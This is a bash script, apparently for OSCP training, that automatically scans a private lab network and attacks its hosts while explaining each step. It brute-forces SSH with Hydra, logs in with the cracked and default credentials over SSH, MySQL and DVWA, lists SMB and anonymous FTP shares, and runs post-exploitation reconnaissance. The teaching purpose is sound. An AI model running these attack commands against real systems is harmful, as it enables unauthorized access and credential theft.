#!/bin/bash

# OSCP Lab Automated Demonstration with Educational Commentary
# This script performs REAL scans and exploits with explanations
# Perfect for demonstrating to students before they try manually
# MUST BE RUN AS ROOT

set +e  # Continue even if commands fail (for demo purposes)

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo ""
    echo "❌ ERROR: This demo must be run as root!"
    echo ""
    echo "Please run one of these:"
    echo "  • sudo ./automated-demo-with-explanations.sh"
    echo "  • su -c './automated-demo-with-explanations.sh'"
    echo "  • Login as root first, then run the script"
    echo ""
    exit 1
fi

# Colors for better visibility
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
RED='\033[0;31m'
NC='\033[0m'
BOLD='\033[1m'

# Timing Configuration
COMMAND_DELAY=2      # Delay before running command
SHORT_PAUSE=5        # Short reading pause
MEDIUM_PAUSE=8       # Medium reading pause
LONG_PAUSE=12        # Long reading pause for complex output

# Functions for educational display
show_section() {
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}${BOLD}   $1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    sleep 3
}

explain() {
    echo ""
    echo -e "${MAGENTA}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MAGENTA}│ 📚 EXPLANATION:                                             │${NC}"
    echo -e "${MAGENTA}│                                                             │${NC}"
    echo -e "${MAGENTA}│${NC} $1"
    echo -e "${MAGENTA}│                                                             │${NC}"
    echo -e "${MAGENTA}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    sleep $MEDIUM_PAUSE
}

run_command() {
    echo -e "${CYAN}┌[student@kali]─[~]${NC}"
    echo -e "${CYAN}└──╼ \$${NC} ${YELLOW}$1${NC}"
    sleep $COMMAND_DELAY
    echo ""
    eval "$1"
    local exit_code=$?
    echo ""
    if [ $exit_code -eq 0 ]; then
        echo -e "${GREEN}[✓] Command completed successfully${NC}"
    else
        echo -e "${YELLOW}[!] Command completed with warnings/errors (this is normal for some tools)${NC}"
    fi
    sleep $SHORT_PAUSE
}

show_tip() {
    echo -e "${YELLOW}💡 TIP: $1${NC}"
    sleep 3
}

show_warning() {
    echo -e "${RED}⚠️  IMPORTANT: $1${NC}"
    sleep 3
}

pause_for_reading() {
    echo -e "\n${CYAN}[⏸  Pausing $1 seconds to read output...]${NC}\n"
    sleep $1
}

# Start the demonstration
clear
echo -e "${GREEN}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║                                                                   ║"
echo "║        OSCP LAB AUTOMATED DEMONSTRATION WITH EXPLANATIONS        ║"
echo "║                                                                   ║"
echo "║         Watch and Learn Before Trying It Yourself!               ║"
echo "║                                                                   ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""
echo -e "${YELLOW}This demonstration will show you:${NC}"
echo "  • How to install required tools"
echo "  • How to discover hosts on the network"
echo "  • How to scan for open ports and services"
echo "  • How to enumerate vulnerable services"
echo "  • How to exploit discovered vulnerabilities"
echo "  • How to document your findings"
echo ""
echo -e "${CYAN}Total demo time: ~15-20 minutes${NC}"
echo ""
echo -e "${GREEN}Press Enter to begin the demonstration...${NC}"
read -p ""

# ═══════════════════════════════════════════════════════════════
# PHASE 0: ENVIRONMENT CHECK
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 0: ENVIRONMENT VERIFICATION"

explain "First, we always verify our environment. We need to know:
         • What IP address we have
         • If we can reach the network
         • What tools are available"

run_command "whoami"
run_command "hostname"
run_command "ip addr show eth0 | grep inet"

explain "We are at IP 172.16.0.12 (Kali machine 2) on the lab network.
         The target network is 172.16.0.0/24"

# ═══════════════════════════════════════════════════════════════
# PHASE 1: TOOL INSTALLATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 1: INSTALLING REQUIRED TOOLS"

explain "Kali containers start minimal. We need to install tools.
         'apt update' downloads the list of available packages.
         'apt install' installs the tools we need."

show_warning "Always run 'apt update' FIRST or packages won't be found!"

run_command "apt update 2>&1 | tail -5"

explain "Now we install the essential tools for penetration testing.
         We'll install them in groups to see what each provides."

echo -e "${YELLOW}Installing network tools...${NC}"
run_command "apt install -y nmap netcat-traditional net-tools iputils-ping dnsutils 2>&1 | grep -E 'Setting up|installed' | tail -5"

echo -e "${YELLOW}Installing enumeration tools...${NC}"
run_command "apt install -y gobuster enum4linux smbclient ftp 2>&1 | grep -E 'Setting up|installed' | tail -5"

echo -e "${YELLOW}Installing exploitation tools...${NC}"
run_command "apt install -y hydra sqlmap 2>&1 | grep -E 'Setting up|installed' | tail -5"

echo -e "${YELLOW}Installing database clients...${NC}"
run_command "apt install -y mysql-client redis-tools 2>&1 | grep -E 'Setting up|installed' | tail -5"

show_tip "In the real OSCP, these tools are pre-installed. But knowing how to install them is valuable!"

# ═══════════════════════════════════════════════════════════════
# PHASE 2: NETWORK DISCOVERY
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 2: NETWORK DISCOVERY"

explain "The FIRST step in any pentest is discovering what's on the network.
         We use 'nmap -sn' for a ping sweep (no port scan).
         This is fast and stealthy."

run_command "nmap -sn 172.16.0.0/24 | grep -E 'Nmap scan report|hosts up'"

pause_for_reading $MEDIUM_PAUSE

explain "We found 14 hosts! Let's identify what they are:
         • 172.16.0.11-14: Kali attack machines (students)
         • 172.16.0.20-110: Target machines (various services)"

show_tip "Always save your scans: add '-oN discovery.txt' to save output!"

# ═══════════════════════════════════════════════════════════════
# PHASE 3: PORT SCANNING
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 3: PORT SCANNING"

explain "Now we scan for open ports. We'll start with a few targets.
         '-sS' = SYN scan (stealthy)
         '-sV' = Version detection  
         '-sC' = Default scripts
         '--min-rate' = Speed up the scan"

echo -e "${YELLOW}Scanning SSH Server (172.16.0.20)...${NC}"
run_command "nmap -sV -sC -p22 172.16.0.20"

pause_for_reading $MEDIUM_PAUSE

explain "Found SSH on port 22! OpenSSH 7.4 - might have weak credentials."

echo -e "${YELLOW}Scanning Web Server (172.16.0.30)...${NC}"
run_command "nmap -sV -sC -p80 172.16.0.30"

pause_for_reading $MEDIUM_PAUSE

explain "Found a web server running DVWA (Damn Vulnerable Web App).
         This is intentionally vulnerable - perfect for practice!"

echo -e "${YELLOW}Quick scan of FTP Server (172.16.0.40)...${NC}"
run_command "nmap -sV -sC -p21 172.16.0.40 | grep -E 'PORT|ftp|anon'"

explain "Anonymous FTP is allowed! This means we can login without a password."

echo -e "${YELLOW}Checking MySQL Database (172.16.0.50)...${NC}"
run_command "nmap -sV -p3306 172.16.0.50"

explain "MySQL is open and accepting connections. Often has weak passwords."

show_tip "In real OSCP, scan ALL ports: nmap -p- (65535 ports). We're doing quick scans for demo."

# ═══════════════════════════════════════════════════════════════
# PHASE 4: SERVICE ENUMERATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 4: SERVICE ENUMERATION"

explain "Before exploiting, we enumerate (gather information) about each service.
         This helps us understand what we're attacking."

echo -e "${YELLOW}Testing FTP Anonymous Access...${NC}"
explain "FTP anonymous access means username='anonymous', password='anonymous'"

run_command "echo -e 'USER anonymous\nPASS anonymous\nLIST\nQUIT' | nc 172.16.0.40 21 | head -15"

show_tip "We could also use: ftp 172.16.0.40 (interactive) or ftp -n (scripted)"

echo -e "${YELLOW}Enumerating SMB Shares...${NC}"
explain "SMB (Windows file sharing) often has misconfigured permissions."

run_command "smbclient -L //172.16.0.60 -N 2>&1 | grep -E 'Sharename|Disk|Enter'"

explain "Found 'public' share! -N means no password (null session)."

echo -e "${YELLOW}Checking Web Application...${NC}"
run_command "curl -s http://172.16.0.30 | grep -i 'password' | head -2"

explain "The DVWA login page shows default credentials! admin:password"

# ═══════════════════════════════════════════════════════════════
# PHASE 5: EXPLOITATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 5: EXPLOITATION DEMONSTRATION"

explain "Now we exploit the vulnerabilities we found.
         Remember: In real pentest, ALWAYS get permission first!"

echo -e "${YELLOW}Exploit 1: SSH Password Attack${NC}"
explain "We'll try common passwords against SSH using Hydra."

# Create a small password list
echo -e "admin\npassword\ntoor\nroot" > /tmp/passwords.txt

run_command "hydra -l root -P /tmp/passwords.txt ssh://172.16.0.20 -t 4 -f 2>&1 | grep -E 'host:|valid|attempt'"

explain "Found it! root:toor (toor is root backwards - common weak password)"

echo -e "${YELLOW}Testing SSH Access...${NC}"
run_command "sshpass -p toor ssh -o StrictHostKeyChecking=no root@172.16.0.20 'id; hostname; exit'"

show_tip "We used sshpass for demo. Normally you'd type: ssh root@172.16.0.20"

echo -e "${YELLOW}Exploit 2: MySQL Connection${NC}"
explain "Let's try default MySQL credentials."

run_command "mysql -h 172.16.0.50 -u root -ppassword123 -e 'SHOW DATABASES;' 2>&1"

explain "Success! We have root access to MySQL database."

echo -e "${YELLOW}Exploit 3: SMB File Access${NC}"
explain "Let's download files from the SMB share."

run_command "smbclient //172.16.0.60/public -N -c 'ls; quit' 2>&1 | grep -E 'credentials|blocks'"

explain "There's a credentials.txt file! In real pentest, we'd download and examine it."

echo -e "${YELLOW}Exploit 4: Web Application Login${NC}"
explain "Let's login to DVWA using the default credentials we found."

run_command "curl -s -X POST http://172.16.0.30/login.php -d 'username=admin&password=password&Login=Login' -i | grep -E 'Location|Set-Cookie' | head -3"

explain "The 302 redirect and session cookie mean successful login!"

# ═══════════════════════════════════════════════════════════════
# PHASE 6: POST-EXPLOITATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 6: POST-EXPLOITATION TECHNIQUES"

explain "After gaining access, we gather more information and escalate privileges.
         This phase is crucial for demonstrating impact."

echo -e "${YELLOW}Information Gathering on Compromised System${NC}"
run_command "sshpass -p toor ssh -o StrictHostKeyChecking=no root@172.16.0.20 'cat /etc/passwd | wc -l; ls /home/; ps aux | wc -l; exit'"

explain "We can see users, processes, and system information.
         In real pentest, we'd look for sensitive data and paths to other systems."

echo -e "${YELLOW}Checking for Password Reuse${NC}"
explain "Attackers often find passwords that work on multiple systems."

run_command "sshpass -p password123 ssh -o StrictHostKeyChecking=no root@172.16.0.20 'echo test' 2>&1 | head -2 || echo 'Password reuse test: Failed (good!)'"

# ═══════════════════════════════════════════════════════════════
# PHASE 7: VULNERABILITY SCANNING
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 7: AUTOMATED VULNERABILITY SCANNING"

explain "Nmap has scripts to check for known vulnerabilities.
         '--script vuln' runs all vulnerability detection scripts."

echo -e "${YELLOW}Scanning for Web Vulnerabilities...${NC}"
run_command "nmap --script http-enum -p80 172.16.0.30 | grep -E '|_' | head -10"

explain "These scripts find common files, directories, and vulnerabilities automatically."

# ═══════════════════════════════════════════════════════════════
# PHASE 8: DOCUMENTATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 8: DOCUMENTATION & REPORTING"

explain "CRITICAL: Document everything! In OSCP, your report is as important as the hacks.
         Create evidence files, save screenshots, and note all commands."

echo -e "${YELLOW}Creating Evidence Directory...${NC}"
run_command "mkdir -p ~/evidence"

echo -e "${YELLOW}Saving Scan Results...${NC}"
run_command "echo 'Network Discovery: 14 hosts found' > ~/evidence/findings.txt"
run_command "echo 'SSH Server: root:toor (172.16.0.20)' >> ~/evidence/findings.txt"
run_command "echo 'MySQL: root:password123 (172.16.0.50)' >> ~/evidence/findings.txt"
run_command "echo 'DVWA: admin:password (172.16.0.30)' >> ~/evidence/findings.txt"

run_command "cat ~/evidence/findings.txt"

show_tip "Real OSCP tip: Take screenshots! Use 'scrot' or 'import' commands."

# ═══════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════

show_section "DEMONSTRATION COMPLETE - SUMMARY"

echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}${BOLD}   Congratulations! You've seen a complete penetration test!${NC}"
echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}📊 What We Accomplished:${NC}"
echo "  ✅ Installed necessary tools"
echo "  ✅ Discovered 14 live hosts"
echo "  ✅ Identified vulnerable services"
echo "  ✅ Found weak/default credentials"
echo "  ✅ Gained access to multiple systems"
echo "  ✅ Demonstrated post-exploitation"
echo "  ✅ Documented our findings"
echo ""

echo -e "${CYAN}🔑 Compromised Systems:${NC}"
echo "  • SSH Server (root access)"
echo "  • MySQL Database (root access)"
echo "  • DVWA Web App (admin access)"
echo "  • SMB Share (file access)"
echo "  • FTP Server (anonymous access)"
echo ""

echo -e "${MAGENTA}📚 Key Lessons:${NC}"
echo "  1. ENUMERATION IS KEY - Spend time discovering and understanding"
echo "  2. Default credentials are everywhere - Always try them"
echo "  3. Document everything - Your notes are crucial"
echo "  4. Think like an attacker - What would you do with this access?"
echo "  5. Practice methodology - Have a systematic approach"
echo ""

echo -e "${GREEN}🎯 Your Turn Now!${NC}"
echo "  This was an automated demo. Now try these commands manually!"
echo "  Start with: nmap -sn 172.16.0.0/24"
echo "  Follow the STUDENT_INSTRUCTIONS_REALISTIC.md guide"
echo ""

echo -e "${YELLOW}${BOLD}Remember: This is for learning only. Never attack systems without permission!${NC}"
echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "   Demo Duration: ~15 minutes | Real Practice: 3-4 hours"
echo "═══════════════════════════════════════════════════════════════"
echo ""